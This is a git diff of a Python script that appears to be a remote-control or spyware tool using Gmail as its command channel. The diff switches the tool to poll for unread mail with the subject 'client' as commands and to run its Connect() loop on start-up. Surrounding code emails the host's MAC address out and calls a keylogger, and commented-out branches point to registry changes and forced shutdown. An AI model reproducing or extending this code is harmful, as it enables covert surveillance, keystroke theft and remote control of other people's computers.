@@ -80,8 +80,8 @@ def read_mail():
         # Call the Gmail API
         service = build('gmail', 'v1', credentials=creds)
         # query list message with subject client and not read
-        # results = service.users().messages().list(userId='me', q='is:unread subject:client').execute()
-        results = service.users().messages().list(userId='me').execute()
+        results = service.users().messages().list(userId='me', q='is:unread subject:client').execute()
+        # results = service.users().messages().list(userId='me').execute()
         mes = results.get('messages', [])
         if not mes:
             print("No letter find out")
@@ -98,7 +98,7 @@ def read_mail():
                 """
                 # Mark read letter from gmail
                 mark_as_read(service, m)
-                #return res
+                return res
 
     except HttpError as error:
         # TODO(developer) - Handle errors from gmail API.
@@ -136,7 +136,7 @@ def mark_as_read(service, m):
 
 
 def mac_address():
-    send_mail("MAC:", hex(uuid.getnode()))
+    send_mail("MAC", hex(uuid.getnode()))
     return
 def key_logger():
     kls.keylogger()
@@ -164,7 +164,6 @@ def Connect():
         #     registry()
         # elif "SD_LO" in cmd:
         #     shutdown_logout() 
-        time.sleep(3)
 
 
 # def create_window():
@@ -187,8 +186,8 @@ def Connect():
 
 # create_window()
 if __name__ == '__main__':
-    # Connect()
-    read_mail()
+    Connect()
+    # read_mail()
     # while True:
     #     read_mail()
     #     time.sleep(10)
